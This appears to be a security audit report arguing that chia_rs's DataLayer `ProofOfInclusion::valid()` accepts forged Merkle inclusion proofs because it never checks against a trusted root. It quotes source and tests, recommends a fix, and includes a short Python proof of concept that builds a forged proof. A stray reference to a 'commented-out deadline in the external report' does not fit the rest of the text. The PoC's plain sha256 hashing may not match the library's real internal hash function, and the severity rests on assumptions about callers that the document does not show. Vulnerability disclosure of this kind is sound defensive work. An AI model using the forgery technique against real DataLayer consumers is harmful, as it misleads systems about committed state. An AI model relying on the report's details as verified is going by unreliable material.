### Title
`ProofOfInclusion::valid()` Missing External Root Hash Parameter Enables Forged DataLayer Inclusion Proofs — (`File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` verifies only the internal self-consistency of a proof's hash chain. It never accepts or checks against an external, trusted root hash. The `root_hash()` helper it relies on simply returns the last `combined_hash` field from the proof itself. Any attacker who can supply a `ProofOfInclusion` object (via Python bindings, deserialization, or network delivery) can construct a proof that is internally consistent but proves inclusion of a key that is not actually present in the tree, or proves inclusion against a completely different tree root.

---

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()
}
``` [1](#0-0) 

The final comparison `existing_hash == self.root_hash()` is self-referential: `root_hash()` returns `last.combined_hash` from the proof's own layer list.

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

The function signature accepts no `expected_root: &Hash` parameter. The missing parameter is the direct analog of the commented-out `deadline` in the external report: a critical external constraint that is supposed to be checked but is structurally absent from the API.

The function is exposed to Python via:

```rust
#[pyo3(name = "valid")]
pub fn py_valid(&self) -> bool {
    self.valid()
}
``` [3](#0-2) 

Both the Rust tests and the Python test suite call `proof.valid()` as the sole verification step, with no separate root-hash comparison:

```python
proof_of_inclusion = merkle_blob.get_proof_of_inclusion(kv_id)
assert proof_of_inclusion.valid()
``` [4](#0-3) 

The fuzz target similarly calls only `proof.valid()`:

```rust
let proof = blob.get_proof_of_inclusion(key).unwrap();
assert!(proof.valid());
``` [5](#0-4) 

The `MerkleSet`-based `validate_merkle_proof` function in the consensus crate does correctly accept and check an external root:

```rust
pub fn validate_merkle_proof(
    proof: &[u8],
    item: &[u8; 32],
    root: &[u8; 32],
) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root {
        return Err(SetError);
    }
    Ok(tree.generate_proof(item)?.0)
}
``` [6](#0-5) 

The DataLayer `ProofOfInclusion::valid()` lacks this same pattern.

---

### Impact Explanation

**High** — DataLayer Merkle proof logic accepts forged inclusion proofs, letting untrusted input prove invalid state.

An attacker who controls a `ProofOfInclusion` object (received over the network, deserialized from untrusted bytes, or constructed directly via the Python binding) can:

1. Choose an arbitrary `node_hash` (the key they want to falsely prove is included).
2. Build a chain of `ProofOfInclusionLayer` values where each `combined_hash` is computed correctly from the previous layer's hash and a chosen `other_hash`.
3. Call `valid()` — it returns `true` because the chain is internally consistent, even though the final `combined_hash` does not match the actual committed tree root.

This allows proving inclusion of keys that are not in the DataLayer tree, corrupting the verified state of DataLayer commitments.

---

### Likelihood Explanation

The Python binding exposes `valid()` directly and the entire test suite treats it as the complete proof-verification API. Any Python consumer of DataLayer proofs that follows the documented pattern (`proof.valid()`) is vulnerable. The `ProofOfInclusion` struct is `Streamable`, so it can be deserialized from arbitrary bytes by an untrusted peer.

---

### Recommendation

Add an `expected_root: &Hash` parameter to `valid()` (and `py_valid()`), and compare the computed root against it instead of against `self.root_hash()`:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root
}
```

This mirrors the correct pattern already used in `validate_merkle_proof` in `crates/chia-consensus/src/merkle_tree.rs`.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker wants to forge proof that fake_key_hash is in the tree
fake_key_hash = bytes([0xAA] * 32)
fake_other_hash = bytes([0xBB] * 32)

# Compute a valid-looking combined_hash
def sha256(a, b):
    return hashlib.sha256(a + b).digest()

combined = sha256(fake_key_hash, fake_other_hash)

layer = ProofOfInclusionLayer(
    other_hash_side=1,       # right side
    other_hash=fake_other_hash,
    combined_hash=combined,  # attacker controls this
)

proof = ProofOfInclusion(node_hash=fake_key_hash, layers=[layer])

# valid() returns True even though this proof was never generated
# from any real MerkleBlob and the root is attacker-controlled
assert proof.valid()  # passes — forged proof accepted
```

The `valid()` call succeeds because `root_hash()` returns `layer.combined_hash`, which the attacker set to match their computed hash. No real tree root is ever consulted.
